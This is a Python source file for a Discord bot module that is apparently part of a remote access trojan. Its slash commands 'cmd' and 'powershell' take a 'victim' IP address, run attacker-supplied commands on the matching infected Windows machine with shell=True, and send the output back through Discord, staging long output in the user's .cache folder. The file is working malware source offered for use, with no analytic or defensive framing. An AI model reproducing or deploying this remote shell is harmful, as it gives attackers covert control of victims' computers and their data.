import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, subprocess, time
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class Shell(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Executes command prompt commands",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
            discord.Option("command", description="The CMD command which will be executed", required=True),
        ]
    )
    async def cmd(self, ctx, victim, command): 
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            output = subprocess.run(
                command, 
                shell=True,
                stdin=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE, 
            ).stdout.decode('utf-8')
            
            if len(output) > 4095:
                os.chdir(nr_working)
                with open("output.txt", 'w+') as f:
                    f.write(output)
                await ctx.followup.send(
                    f"Output for `{command}`:", 
                    file = discord.File( "output.txt" )
                )
                time.sleep(2)
                os.remove("output.txt")
                os.chdir(self.bot.original_dir)
                return None
                
            embed = self.bot.genEmbed(
                f"Output for `{command}`:",
                datetime.now(),
                f"```{output}```"
            )
            await ctx.followup.send(embed=embed)

    @commands.slash_command(
        description="Executes Powershell commands",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
            discord.Option("command", description="The PS command which will be executed", required=True),
        ]
    )
    async def powershell(self, ctx, victim, command): 
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            
            output = subprocess.run(
                "powershell.exe" + command, 
                shell=True,
                stdin=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE, 
            ).stdout.decode('utf-8')
            
            if len(output) > 4095:
                os.chdir(nr_working)
                with open("output.txt", 'w+') as f:
                    f.write(output)
                await ctx.followup.send(
                    f"Output for `{command}`:", 
                    file = discord.File( "output.txt" )
                )
                time.sleep(2)
                os.remove("output.txt")
                os.chdir(self.bot.original_dir)
                return None
                
            embed = self.bot.genEmbed(
                f"Output for `{command}`:",
                datetime.now(),
                f"```{output}```"
            )
            await ctx.followup.send(embed=embed)
            
def setup(bot: commands.Bot):
    bot.add_cog(Shell(bot))